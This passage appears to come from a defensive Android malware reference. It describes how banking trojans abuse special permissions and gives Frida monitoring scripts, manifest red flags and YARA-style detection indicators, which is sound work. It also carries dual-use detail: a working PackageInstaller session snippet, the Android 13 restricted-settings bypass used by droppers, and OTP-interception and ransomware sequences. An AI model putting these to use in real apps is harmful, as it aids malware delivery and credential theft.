Java.use(\"android.view.accessibility.AccessibilityNodeInfo\");\n\n    AccessibilityNodeInfo.performAction.overload(\"int\").implementation = function(action) {\n        console.log(\"[A11y] performAction: \" + action + \" on \" + this.getClassName());\n        return this.performAction(action);\n    };\n\n    AccessibilityNodeInfo.performAction.overload(\"int\", \"android.os.Bundle\").implementation = function(action, args) {\n        console.log(\"[A11y] performAction: \" + action + \" args=\" + args + \" on \" + this.getClassName());\n        return this.performAction(action, args);\n    };\n});\n</code></pre>"},{"location":"permissions/special/bind-accessibility-service/#detection","title":"Detection","text":""},{"location":"permissions/special/bind-accessibility-service/#manifest-indicators","title":"Manifest Indicators","text":"<pre><code>&lt;service\n    android:name=\".MyAccessibilityService\"\n    android:permission=\"android.permission.BIND_ACCESSIBILITY_SERVICE\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.accessibilityservice.AccessibilityService\" /&gt;\n    &lt;/intent-filter&gt;\n    &lt;meta-data\n        android:name=\"android.accessibilityservice\"\n        android:resource=\"@xml/accessibility_config\" /&gt;\n&lt;/service&gt;\n</code></pre>"},{"location":"permissions/special/bind-accessibility-service/#accessibility-config-red-flags","title":"Accessibility Config Red Flags","text":"<pre><code>&lt;accessibility-service\n    android:accessibilityEventTypes=\"typeAllMask\"\n    android:accessibilityFeedbackType=\"feedbackGeneric\"\n    android:canRetrieveWindowContent=\"true\"\n    android:canPerformGestures=\"true\"\n    android:accessibilityFlags=\"flagRetrieveInteractiveWindows\" /&gt;\n</code></pre> <p>Key indicators: <code>typeAllMask</code> event types, <code>canRetrieveWindowContent</code>, <code>canPerformGestures</code>, <code>flagRetrieveInteractiveWindows</code>. Legitimate accessibility tools (screen readers, switch access) typically scope to specific event types and do not request gesture capabilities.</p>"},{"location":"permissions/special/bind-accessibility-service/#yara-indicators","title":"YARA Indicators","text":"<p>Look for the combination of:</p> <ul> <li><code>BIND_ACCESSIBILITY_SERVICE</code> in manifest</li> <li><code>typeAllMask</code> or <code>typeWindowStateChanged|typeWindowContentChanged</code> in accessibility config</li> <li><code>canRetrieveWindowContent=\"true\"</code> and <code>canPerformGestures=\"true\"</code> together</li> <li>References to <code>UsageStatsManager</code> or <code>getRunningTasks</code> (foreground app detection)</li> <li>Accessibility service class containing <code>performAction</code>, <code>ACTION_SET_TEXT</code>, or <code>GestureDescription</code></li> </ul>"},{"location":"permissions/special/bind-device-admin/","title":"BIND_DEVICE_ADMIN","text":"<p>Grants device administration capabilities: locking the screen, wiping data, enforcing password policies, and preventing its own uninstallation. Early Android malware (2013-2016) used device admin heavily for ransomware and persistence. Modern malware prefers accessibility services, but device admin still appears in some families.</p>"},{"location":"permissions/special/bind-device-admin/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.BIND_DEVICE_ADMIN</code> Protection Level <code>signature</code> Grant Method User must explicitly activate via system dialog Introduced API 8 (Android 2.2) <p>The app declares a <code>DeviceAdminReceiver</code> in its manifest. When the app requests activation, Android shows a full-screen dialog listing all the capabilities the admin is requesting. The user must explicitly confirm.</p>"},{"location":"permissions/special/bind-device-admin/#what-it-enables","title":"What It Enables","text":"Capability API Method Impact Lock screen <code>lockNow()</code> Immediately lock device Set password <code>resetPassword()</code> Force a lock screen password Wipe device <code>wipeData()</code> Factory reset, destroying all data Set password quality <code>setPasswordQuality()</code> Enforce password complexity Monitor failed attempts <code>setMaximumFailedPasswordsForWipe()</code> Auto-wipe after N failed attempts Disable camera <code>setCameraDisabled()</code> Block camera use Prevent uninstall Implicit Device admin apps cannot be uninstalled until deactivated"},{"location":"permissions/special/bind-device-admin/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/bind-device-admin/#ransomware","title":"Ransomware","text":"<p>The primary abuse case historically. Malware activates device admin, then:</p> <ol> <li>Locks the screen with <code>lockNow()</code></li> <li>Changes the password with <code>resetPassword()</code></li> <li>Displays ransom message</li> <li>Threatens <code>wipeData()</code> if ransom is not paid</li> </ol>"},{"location":"permissions/special/bind-device-admin/#anti-uninstall","title":"Anti-Uninstall","text":"<p>A device admin app cannot be uninstalled through normal means. The user must first navigate to Settings &gt; Security &gt; Device Administrators and deactivate the admin, then uninstall. Malware using accessibility can prevent the user from reaching these settings.</p>"},{"location":"permissions/special/bind-device-admin/#notable-families","title":"Notable Families","text":"Family Device Admin Usage Obad First major device admin abuse (2013). Hid itself from admin list using a vulnerability. Koler Police ransomware. Lock screen with fake law enforcement message. Simplocker File encryption + device admin lock. LokiBot Activates ransomware mode via device admin when user tries to revoke. Cerberus Optional device admin for anti-uninstall. Rafel RAT DeviceAdmin for ransomware lock screen, password reset, and device wipe BRATA Factory reset via <code>wipeData()</code> after completing fraud to destroy evidence BingoMod Device wipe after on-device fraud to erase forensic traces"},{"location":"permissions/special/bind-device-admin/#android-version-changes","title":"Android Version Changes","text":"<p>Android 7.0 (API 24): <code>resetPassword()</code> deprecated for device admin. Only device owner (MDM) or profile owner can reset passwords.</p> <p>Android 9.0 (API 28): device admin policies for password quality, password expiration, and other features deprecated in favor of managed profiles. Device admin is being phased out for enterprise use in favor of Android Enterprise.</p> <p>Android 10+ (API 29+): <code>resetPassword()</code> completely removed for device admin apps. Ransomware using this technique only works on older Android versions.</p>"},{"location":"permissions/special/bind-device-admin/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;receiver android:name=\".AdminReceiver\"\n    android:permission=\"android.permission.BIND_DEVICE_ADMIN\"&gt;\n    &lt;meta-data android:name=\"android.app.device_admin\"\n        android:resource=\"@xml/device_admin\" /&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.app.action.DEVICE_ADMIN_ENABLED\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> <p>The <code>device_admin.xml</code> declares requested policies:</p> <pre><code>&lt;device-admin&gt;\n    &lt;uses-policies&gt;\n        &lt;force-lock /&gt;\n        &lt;wipe-data /&gt;\n        &lt;reset-password /&gt;\n    &lt;/uses-policies&gt;\n&lt;/device-admin&gt;\n</code></pre> <p>Any non-MDM app requesting <code>force-lock</code>, <code>wipe-data</code>, or <code>reset-password</code> policies is suspicious.</p>"},{"location":"permissions/special/bind-notification-listener-service/","title":"BIND_NOTIFICATION_LISTENER_SERVICE","text":"<p>Allows reading the content of all notifications posted by any app. Increasingly used as an alternative to <code>READ_SMS</code> for OTP interception: banks send OTP codes that appear in notifications, and a notification listener captures them without needing SMS permissions.</p>"},{"location":"permissions/special/bind-notification-listener-service/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.BIND_NOTIFICATION_LISTENER_SERVICE</code> Protection Level <code>signature</code> Grant Method Settings &gt; Apps &gt; Special access &gt; Notification access Introduced API 18 (Android 4.3) <p>Like accessibility services, only the system can bind to a notification listener. The user must manually enable it in settings.</p>"},{"location":"permissions/special/bind-notification-listener-service/#what-it-enables","title":"What It Enables","text":"<p>The service receives callbacks for every notification posted or removed on the device:</p> <pre><code>public class NotifListener extends NotificationListenerService {\n    @Override\n    public void onNotificationPosted(StatusBarNotification sbn) {\n        String packageName = sbn.getPackageName();\n        String text = sbn.getNotification().extras.getString(Notification.EXTRA_TEXT);\n        String title = sbn.getNotification().extras.getString(Notification.EXTRA_TITLE);\n    }\n}\n</code></pre> <p>Capabilities:</p> Capability Method Read notification content <code>onNotificationPosted()</code> Read notification history <code>getActiveNotifications()</code> Dismiss notifications <code>cancelNotification()</code> Snooze notifications <code>snoozeNotification()</code> (API 26+)"},{"location":"permissions/special/bind-notification-listener-service/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/bind-notification-listener-service/#otp-interception-sms-alternative","title":"OTP Interception (SMS Alternative)","text":"<p>Many banks and services include the OTP code directly in the notification text. A notification listener grabs it without needing <code>READ_SMS</code> or <code>RECEIVE_SMS</code>:</p> <ol> <li>User triggers a login/transaction that requires 2FA</li> <li>Bank sends SMS with OTP</li> <li>Phone displays notification: \"Your code is 123456\"</li> <li>Notification listener reads the notification text</li> <li>Malware forwards the code to C2</li> </ol> <p>This bypasses Google Play's SMS permission restrictions, since notification access is not subject to the same policy scrutiny.</p>"},{"location":"permissions/special/bind-notification-listener-service/#message-exfiltration","title":"Message Exfiltration","text":"<p>Read messages from WhatsApp, Telegram, Signal, and other messaging apps via their notifications. Each notification contains sender name and message preview.</p>"},{"location":"permissions/special/bind-notification-listener-service/#notification-dismissal","title":"Notification Dismissal","text":"<p>Malware can dismiss notifications to hide its activity:</p> <ul> <li>Dismiss banking app transaction alerts</li> <li>Dismiss security warnings</li> <li>Dismiss AV detection notifications</li> </ul>"},{"location":"permissions/special/bind-notification-listener-service/#foreground-app-detection","title":"Foreground App Detection","text":"<p>Notifications from apps reveal which apps are active, serving as an alternative to <code>UsageStatsManager</code> for timing overlay attacks.</p>"},{"location":"permissions/special/bind-notification-listener-service/#notable-families","title":"Notable Families","text":"Family Notification Usage Cerberus Notification-based OTP theft as alternative to SMS Alien Notification sniffing for 2FA codes. First family to make this a primary feature. Xenomorph Notification listener for OTP + message exfiltration Joker Read notifications to confirm premium subscriptions Hook Notification interception for WhatsApp message exfiltration Mamont Notification interception as primary OTP theft mechanism GodFather Notification-based push OTP capture Medusa v2 Reduced to 5 permissions, uses notification listener instead of SMS ToxicPanda Notification interception for OTP codes Sturnus Notification capture from encrypted messaging apps"},{"location":"permissions/special/bind-notification-listener-service/#android-version-changes","title":"Android Version Changes","text":"<p>Android 4.3 (API 18): notification listener service introduced.</p> <p>Android 13 (API 33): subject to restricted settings. Apps sideloaded from outside recognized stores cannot direct users to notification access settings.</p> <p>Android 13+: <code>POST_NOTIFICATIONS</code> runtime permission required for apps to show their own notifications (separate concern, but affects the ecosystem).</p>"},{"location":"permissions/special/bind-notification-listener-service/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;service\n    android:name=\".NotifListener\"\n    android:permission=\"android.permission.BIND_NOTIFICATION_LISTENER_SERVICE\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.service.notification.NotificationListenerService\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/service&gt;\n</code></pre> <p>Any app declaring this that isn't a notification management utility warrants investigation.</p>"},{"location":"permissions/special/manage-external-storage/","title":"MANAGE_EXTERNAL_STORAGE","text":"<p>Grants full access to all files on shared storage, bypassing Android's scoped storage restrictions introduced in Android 11. With this permission, an app can read, write, and delete any file on the device's external storage (except other apps' private directories).</p>"},{"location":"permissions/special/manage-external-storage/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.MANAGE_EXTERNAL_STORAGE</code> Protection Level <code>signature\\|appop</code> Grant Method Settings &gt; Apps &gt; Special access &gt; All files access Introduced API 30 (Android 11)"},{"location":"permissions/special/manage-external-storage/#what-it-enables","title":"What It Enables","text":"<p>Full access to <code>/sdcard/</code> and all shared storage, including:</p> <ul> <li>Documents, downloads, media files</li> <li>Other apps' publicly visible files</li> <li>WhatsApp media and databases (backup files)</li> <li>Filesystem-level operations (create, read, write, delete, enumerate)</li> </ul> <p>Without this permission, apps targeting API 30+ are limited to their own app-specific directory and media accessed through <code>MediaStore</code>.</p>"},{"location":"permissions/special/manage-external-storage/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/manage-external-storage/#data-exfiltration","title":"Data Exfiltration","text":"<p>Access to all files on the device enables:</p> <ul> <li>WhatsApp database extraction (<code>/sdcard/WhatsApp/Databases/msgstore.db.crypt14</code>)</li> <li>Document theft (PDFs, spreadsheets, photos)</li> <li>Backup file access</li> <li>Browser download folder contents</li> </ul>"},{"location":"permissions/special/manage-external-storage/#payload-dropping","title":"Payload Dropping","text":"<p>Write malicious APKs or DEX files to shared storage for later execution or social engineering-based installation.</p>"},{"location":"permissions/special/manage-external-storage/#file-manipulation","title":"File Manipulation","text":"<p>Replace legitimate files with modified versions (supply chain attack at the file level).</p>"},{"location":"permissions/special/manage-external-storage/#android-version-changes","title":"Android Version Changes","text":"<p>Android 10 (API 29): scoped storage introduced. Apps targeting API 29 could opt out with <code>requestLegacyExternalStorage=\"true\"</code>.</p> <p>Android 11 (API 30): scoped storage enforced. <code>MANAGE_EXTERNAL_STORAGE</code> added as the escape hatch for apps that genuinely need broad file access (file managers, backup tools, antivirus).</p> <p>Android 11+: Google Play restricts this permission to apps that justify the need. Apps without a valid use case are rejected.</p>"},{"location":"permissions/special/manage-external-storage/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.MANAGE_EXTERNAL_STORAGE\" /&gt;\n</code></pre> <p>Any app that isn't a file manager, backup tool, or antivirus requesting this is worth investigating.</p>"},{"location":"permissions/special/package-usage-stats/","title":"PACKAGE_USAGE_STATS","text":"<p>Allows querying app usage statistics: which apps were used, when, and for how long. Used by malware to detect when a target banking app is in the foreground, triggering overlay attacks at the right moment.</p>"},{"location":"permissions/special/package-usage-stats/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.PACKAGE_USAGE_STATS</code> Protection Level <code>signature\\|privileged\\|development\\|appop</code> Grant Method Settings &gt; Apps &gt; Special access &gt; Usage access Introduced API 21 (Android 5.0)"},{"location":"permissions/special/package-usage-stats/#what-it-enables","title":"What It Enables","text":"<p>Access to <code>UsageStatsManager</code>:</p> <pre><code>UsageStatsManager usm = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);\nlong time = System.currentTimeMillis();\nList&lt;UsageStats&gt; stats = usm.queryUsageStats(\n    UsageStatsManager.INTERVAL_DAILY, time - 1000 * 60, time);\n</code></pre> <p>Also enables <code>UsageEvents</code> for more granular event tracking:</p> <pre><code>UsageEvents events = usm.queryEvents(startTime, endTime);\nwhile (events.hasNextEvent()) {\n    UsageEvents.Event event = new UsageEvents.Event();\n    events.getNextEvent(event);\n    if (event.getEventType() == UsageEvents.Event.MOVE_TO_FOREGROUND) {\n        String pkg = event.getPackageName();\n    }\n}\n</code></pre>"},{"location":"permissions/special/package-usage-stats/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/package-usage-stats/#foreground-detection-for-overlays","title":"Foreground Detection for Overlays","text":"<p>The primary abuse case. Malware polls <code>UsageStatsManager</code> every 1-2 seconds to check which app is in the foreground:</p> <ol> <li>Poll <code>queryUsageStats()</code> or <code>queryEvents()</code></li> <li>Check if the foreground package matches a target (banking app)</li> <li>If match found, display overlay immediately</li> </ol> <p>This is the non-accessibility method for triggering overlays. Less efficient than accessibility events (requires polling) but doesn't require the user to enable an accessibility service.</p>"},{"location":"permissions/special/package-usage-stats/#user-behavior-profiling","title":"User Behavior Profiling","text":"<p>Track which apps the user opens, when, and for how long. Useful for:</p> <ul> <li>Determining the best time to display social engineering prompts</li> <li>Identifying high-value targets (banking apps that are actively used)</li> <li>Detecting security tools being launched</li> </ul>"},{"location":"permissions/special/package-usage-stats/#app-installation-tracking","title":"App Installation Tracking","text":"<p><code>UsageEvents</code> includes <code>PACKAGE_INSTALLED</code> and <code>PACKAGE_REMOVED</code> events, revealing when apps are installed or uninstalled.</p>"},{"location":"permissions/special/package-usage-stats/#android-version-changes","title":"Android Version Changes","text":"<p>Android 5.0 (API 21): <code>UsageStatsManager</code> introduced with this permission.</p> <p>Android 5.1+: some vendors (Samsung, Huawei) modified the default grant behavior, making it easier or harder to access depending on the OEM.</p>"},{"location":"permissions/special/package-usage-stats/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.PACKAGE_USAGE_STATS\" /&gt;\n</code></pre> <p>Combined with <code>SYSTEM_ALERT_WINDOW</code> or <code>INTERNET</code>, indicates overlay attack infrastructure. The polling pattern (repeated <code>queryUsageStats</code> calls in a service or scheduled task) is a strong behavioral indicator.</p>"},{"location":"permissions/special/request-delete-packages/","title":"REQUEST_DELETE_PACKAGES","text":"<p>Allows an app to request uninstallation of other apps. The user sees a confirmation dialog. Used by malware to remove antivirus, security tools, or competing malware from the device.</p>"},{"location":"permissions/special/request-delete-packages/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.REQUEST_DELETE_PACKAGES</code> Protection Level <code>normal</code> Grant Method Automatically at install time Introduced API 26 (Android 8.0)"},{"location":"permissions/special/request-delete-packages/#what-it-enables","title":"What It Enables","text":"<pre><code>Intent intent = new Intent(Intent.ACTION_DELETE);\nintent.setData(Uri.parse(\"package:com.security.app\"));\nstartActivity(intent);\n</code></pre> <p>This shows the system uninstall confirmation dialog for the target package. The user must confirm.</p>"},{"location":"permissions/special/request-delete-packages/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/request-delete-packages/#removing-security-software","title":"Removing Security Software","text":"<p>Malware can prompt uninstallation of antivirus or security tools:</p> <ol> <li>Detect installed security apps (via <code>QUERY_ALL_PACKAGES</code>)</li> <li>Trigger uninstall dialog for each one</li> <li>If the malware has accessibility, click \"OK\" on the confirmation automatically</li> </ol>"},{"location":"permissions/special/request-delete-packages/#removing-competing-malware","title":"Removing Competing Malware","text":"<p>Some malware families uninstall competing trojans from the device.</p>"},{"location":"permissions/special/request-delete-packages/#combined-with-accessibility","title":"Combined with Accessibility","text":"<p>With <code>BIND_ACCESSIBILITY_SERVICE</code>, the malware can click through uninstall confirmations without user interaction, making this effectively a silent uninstall capability.</p>"},{"location":"permissions/special/request-delete-packages/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.REQUEST_DELETE_PACKAGES\" /&gt;\n</code></pre> <p>Combined with <code>QUERY_ALL_PACKAGES</code> and accessibility, indicates targeted removal of other apps.</p>"},{"location":"permissions/special/request-install-packages/","title":"REQUEST_INSTALL_PACKAGES","text":"<p>The dropper permission. Allows an app to initiate APK installations on the device, making it the key enabler for multi-stage malware delivery. The first-stage app (dropper) passes Google Play Protect because it contains no malicious code. After installation, it downloads the real payload from C2 and triggers installation. The user sees an install confirmation dialog, but social engineering handles that. This permission is central to the dropper-as-a-service (DaaS) model that dominates the Android malware ecosystem.</p>"},{"location":"permissions/special/request-install-packages/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.REQUEST_INSTALL_PACKAGES</code> Protection Level <code>signature\\|appop</code> Grant Method Settings &gt; Apps &gt; Special access &gt; Install unknown apps Introduced API 26 (Android 8.0) Play Store Policy Restricted to apps with core install functionality since 2022 <p>Before Android 8.0, sideloading was controlled by a single global toggle (\"Unknown sources\") in Settings. Android 8.0 changed this to per-app granularity: each app must be individually authorized to install APKs. Google Play further restricted this permission in 2022, limiting it to apps where package installation is core functionality (app stores, enterprise MDM, file managers).</p>"},{"location":"permissions/special/request-install-packages/#what-it-enables","title":"What It Enables","text":"<p>Two primary installation mechanisms:</p>"},{"location":"permissions/special/request-install-packages/#intent-based-installation","title":"Intent-Based Installation","text":"<pre><code>Intent intent = new Intent(Intent.ACTION_INSTALL_PACKAGE);\nintent.setData(Uri.fromFile(apkFile));\nintent.putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true);\nintent.putExtra(Intent.EXTRA_RETURN_RESULT, true);\nstartActivityForResult(intent, REQUEST_CODE);\n</code></pre> <p>This shows the system install confirmation screen. The user must tap \"Install\" to proceed.</p>"},{"location":"permissions/special/request-install-packages/#session-based-installation-packageinstaller-api","title":"Session-Based Installation (PackageInstaller API)","text":"<pre><code>PackageInstaller installer = getPackageManager().getPackageInstaller();\nPackageInstaller.SessionParams params = new PackageInstaller.SessionParams(\n    PackageInstaller.SessionParams.MODE_FULL_INSTALL\n);\nint sessionId = installer.createSession(params);\n\nPackageInstaller.Session session = installer.openSession(sessionId);\nOutputStream out = session.openWrite(\"payload\", 0, apkBytes.length);\nout.write(apkBytes);\nout.close();\n\nIntent callbackIntent = new Intent(this, InstallReceiver.class);\nPendingIntent pending = PendingIntent.getBroadcast(\n    this, sessionId, callbackIntent,\n    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE\n);\nsession.commit(pending);\n</code></pre> <p>The session-based API is critical for bypassing Android 13+ restricted settings (detailed below).</p>"},{"location":"permissions/special/request-install-packages/#the-dropper-pattern","title":"The Dropper Pattern","text":"<p>The standard multi-stage delivery flow used by the majority of modern Android banking trojans:</p> <pre><code>graph TD\n    A[User downloads dropper from Play Store] --&gt; B[Dropper passes Play Protect - no malicious code]\n    B --&gt; C[Dropper contacts C2 after delay]\n    C --&gt; D[C2 sends payload APK or download URL]\n    D --&gt; E[Dropper prompts user to enable Install unknown apps]\n    E --&gt; F[Dropper triggers APK installation]\n    F --&gt; G[Payload requests accessibility + overlay permissions]\n    G --&gt; H[Banking trojan fully operational]</code></pre> <p>Key characteristics of the dropper model:</p> <ul> <li>Delayed activation: droppers wait hours or days before contacting C2, evading sandbox analysis with short execution windows</li> <li>Server-side control: C2 decides whether to deliver the payload based on device location, carrier, language, and installed apps</li> <li>Clean initial submission: the app submitted to Play Store review contains zero malicious code</li> <li>Legitimate disguise: droppers pose as PDF readers, file managers, QR scanners, phone cleaners -- utility apps that justify <code>REQUEST_INSTALL_PACKAGES</code></li> </ul>"},{"location":"permissions/special/request-install-packages/#dropper-as-a-service-daas","title":"Dropper-as-a-Service (DaaS)","text":"<p>ThreatFabric documented the DaaS model where specialized operators sell dropper services to banking trojan operators. The dropper developer handles Play Store publication, review bypass, and delivery infrastructure. The trojan operator provides the payload. SecuriDropper is a documented DaaS that specifically advertises bypassing Android 13 restricted settings, and has been observed delivering SpyNote and Ermac.</p>"},{"location":"permissions/special/request-install-packages/#session-based-installer-bypass","title":"Session-Based Installer Bypass","text":"<p>Android 13 introduced \"restricted settings\" to block sideloaded apps from accessing accessibility services and notification listeners. The restriction applies to apps installed via <code>ACTION_VIEW</code> or <code>ACTION_INSTALL_PACKAGE</code> intents. However, apps installed via the <code>PackageInstaller.Session</code> API are treated as session-installed -- the same mechanism used by legitimate app stores -- and are exempt from restricted settings.</p> <p>Malware exploits this by:</p> <ol> <li>Using <code>PackageInstaller.createSession()</code> instead of an install intent</li> <li>Writing the payload APK into the session</li> <li>Committing the session, which triggers the system installer</li> <li>The installed payload can then request accessibility service access without the \"restricted settings\" block</li> </ol> <p>This bypass was first documented by ThreatFabric in 2023 and is now standard practice across the dropper ecosystem. Brokewell and BlankBot both use this technique, and the Brokewell developer released a public dropper tool that implements the bypass.</p>"},{"location":"permissions/special/request-install-packages/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/request-install-packages/#notable-families","title":"Notable Families","text":"Family Dropper / Install Abuse Source SharkBot Play Store dropper disguised as file manager, downloads and installs payload post-install NCC Group Anatsa Play Store droppers (PDF readers, cleaners) with delayed payload delivery, 90,000+ installs in single campaigns ThreatFabric PlainGnome Two-stage architecture: dropper component installs separate surveillance payload via session API Lookout Brokewell Custom dropper using session-based installer to bypass Android 13 restricted settings, dropper tool made public ThreatFabric BlankBot Session-based <code>PackageInstaller</code> to bypass Android 13+ sideload restrictions, targets Turkish users Intel 471 SpyNote Dropper APK installs embedded second APK containing core spyware via <code>DialogInterface.OnClickListener</code> F-Secure SecuriDropper (DaaS) Commercial dropper service bypassing restricted settings, delivers multiple trojan families ThreatFabric"},{"location":"permissions/special/request-install-packages/#anatsa-campaign-pattern","title":"Anatsa Campaign Pattern","text":"<p>Anatsa (also known as TeaBot) provides the textbook example of the dropper lifecycle, documented extensively by ThreatFabric and Cleafy:</p> <ol> <li>Developer creates a Play Store account and publishes a legitimate-looking PDF reader or file manager</li> <li>App accumulates organic downloads over several weeks (no malicious behavior during this period)</li> <li>An update is pushed that adds the dropper code</li> <li>The app contacts C2 to retrieve the Anatsa payload</li> <li>Payload is installed via session-based API</li> <li>Anatsa requests accessibility service and begins overlay attacks on banking apps</li> </ol> <p>A single Anatsa dropper published in May 2025 accumulated approximately 90,000 downloads before the malicious update was deployed in late June 2025.</p>"},{"location":"permissions/special/request-install-packages/#android-version-changes","title":"Android Version Changes","text":""},{"location":"permissions/special/request-install-packages/#android-80-api-26","title":"Android 8.0 (API 26)","text":"<p>Per-app install permission introduced. The global \"Unknown sources\" toggle was replaced with individual app authorization. Apps must declare <code>REQUEST_INSTALL_PACKAGES</code> in the manifest and the user must enable it per-app in Settings.</p>"},{"location":"permissions/special/request-install-packages/#android-13-api-33","title":"Android 13 (API 33)","text":"<p>Restricted settings block sideloaded apps from accessing accessibility services and notification listener. This applies to apps installed via direct intent (<code>ACTION_VIEW</code> / <code>ACTION_INSTALL_PACKAGE</code>). Session-based <code>PackageInstaller</code> installations are exempt, creating the bypass that the dropper ecosystem now exploits.</p>"},{"location":"permissions/special/request-install-packages/#android-14-api-34","title":"Android 14 (API 34)","text":"<p>Tightened session-based installer restrictions. Apps must declare specific intent filters for installation callbacks. Additional checks on the installer-of-record relationship. However, the fundamental session-based bypass remains exploitable with minor adaptations to the dropper code.</p>"},{"location":"permissions/special/request-install-packages/#google-play-policy-2022-present","title":"Google Play Policy (2022-Present)","text":"<p>Google restricted <code>REQUEST_INSTALL_PACKAGES</code> to apps with core package installation functionality. Apps must justify why they need to install other packages. File managers, which were previously the primary dropper disguise, now face stricter review. This pushed dropper operators toward alternative covers (PDF readers, QR scanners, phone cleaners) and alternative distribution channels (phishing sites, third-party stores).</p>"},{"location":"permissions/special/request-install-packages/#frida-monitoring-script","title":"Frida Monitoring Script","text":"<p>Monitor <code>PackageInstaller</code> session creation and APK installation:</p> <pre><code>Java.perform(function () {\n    var PackageInstaller = Java.use(\"android.content.pm.PackageInstaller\");\n\n    PackageInstaller.createSession.implementation = function (params) {\n        var sessionId = this.createSession(params);\n        console.log(\"[PackageInstaller] createSession called\");\n        console.log(\"  sessionId: \" + sessionId);\n        console.log(\"  mode: \" + params.mode.value);\n        console.log(\"  appPackageName: \" + params.appPackageName.value);\n        return sessionId;\n    };\n\n    var Session = Java.use(\"android.content.pm.PackageInstaller$Session\");\n\n    Session.commit.implementation = function (statusReceiver) {\n        console.log(\"[PackageInstaller] Session.commit called\");\n        console.log(\"  statusReceiver: \" + statusReceiver);\n        var trace = Java.use(\"android.util.Log\")\n            .getStackTraceString(Java.use(\"java.lang.Exception\").$new());\n        console.log(\"  stacktrace: \" + trace);\n        this.commit(statusReceiver);\n    };\n\n    var Intent = Java.use(\"android.content.Intent\");\n    Intent.setAction.implementation = function (action) {\n        if (action &amp;&amp; action.indexOf(\"INSTALL\") !== -1) {\n            console.log(\"[Intent] Install action: \" + action);\n            console.log(\"  data: \" + this.getData());\n        }\n        return this.setAction(action);\n    };\n});\n</code></pre>"},{"location":"permissions/special/request-install-packages/#detection-indicators","title":"Detection Indicators","text":"<p>Manifest signals:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.REQUEST_INSTALL_PACKAGES\" /&gt;\n</code></pre> <p>High-confidence dropper indicators (combination of):</p> <ul> <li><code>REQUEST_INSTALL_PACKAGES</code> in a non-app-store, non-MDM application</li> <li><code>INTERNET</code> permission with network calls to non-standard domains</li> <li>APK files written to internal storage or cache directories</li> <li><code>PackageInstaller.Session</code> usage in a utility app</li> <li>Delayed C2 contact (timer-based or event-triggered payload download)</li> <li><code>REQUEST_DELETE_PACKAGES</code> alongside install permission (cleanup after dropper phase)</li> <li><code>RECEIVE_BOOT_COMPLETED</code> + <code>FOREGROUND_SERVICE</code> (persistence for the dropper stage)</li> </ul> <p>Static analysis targets:</p> <ul> <li><code>PackageInstaller.createSession()</code> calls</li> <li>File I/O writing <code>.apk</code> files to <code>getFilesDir()</code> or <code>getCacheDir()</code></li> <li>Network download methods followed by file write operations</li> <li>References to <code>ACTION_INSTALL_PACKAGE</code> in intent construction</li> <li>String obfuscation around file extension or URL patterns</li> </ul> <p>See also: Persistence Techniques | Dynamic Code Loading</p>"},{"location":"permissions/special/system-alert-window/","title":"SYSTEM_ALERT_WINDOW","text":"<p>The foundation of overlay attacks on Android. This permission allows drawing windows on top of all other apps, enabling malware to render fake login screens over legitimate banking applications and capture whatever the user types. It remains the most common credential-stealing technique in Android banking trojans, despite years of platform restrictions. Nearly every major banking trojan since 2016 has relied on this permission at some stage of its operation.</p>"},{"location":"permissions/special/system-alert-window/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.SYSTEM_ALERT_WINDOW</code> Protection Level <code>signature\\|appop\\|pre23\\|development</code> Grant Method Settings &gt; Apps &gt; Special access &gt; Display over other apps Introduced API 1 Special Permission Yes (requires explicit user action since API 23) <p>Before Android 6.0, this was a normal install-time permission granted automatically. Since API 23, users must manually toggle it per-app in Settings. On Android 6-7, apps could bypass this requirement entirely by using <code>TYPE_TOAST</code> windows -- a loophole Google patched in Android 8.0. Between API 23 and 25, Google Play apps that requested this permission were auto-granted via an intent, making it trivially easy for Play Store malware to acquire.</p>"},{"location":"permissions/special/system-alert-window/#what-it-enables","title":"What It Enables","text":"<p>The app can create windows using <code>WindowManager.addView()</code> with layout types that render above all other applications:</p> Window Type API Range Behavior <code>TYPE_APPLICATION_OVERLAY</code> 26+ Standard overlay, above apps but below critical system UI <code>TYPE_PHONE</code> 1-25 (deprecated 26) Pre-Oreo overlay type, drawn above application windows <code>TYPE_SYSTEM_ALERT</code> 1-25 (deprecated 26) Pre-Oreo overlay type with higher z-order <code>TYPE_TOAST</code> 1-25 (restricted 26) Exploitable for grantless overlays on Android 6-7 <p>Overlays can be configured in three primary ways:</p> <ul> <li>Fully opaque: replaces the visible UI entirely, used for phishing screens that mimic banking app login pages</li> <li>Transparent/passthrough: invisible layer capturing touch events or routing them to the window beneath (tapjacking)</li> <li>Partial: covers only specific input fields, buttons, or dialog regions to intercept targeted interactions</li> </ul>"},{"location":"permissions/special/system-alert-window/#overlay-injection-code","title":"Overlay Injection Code","text":"<p>A minimal overlay injection using 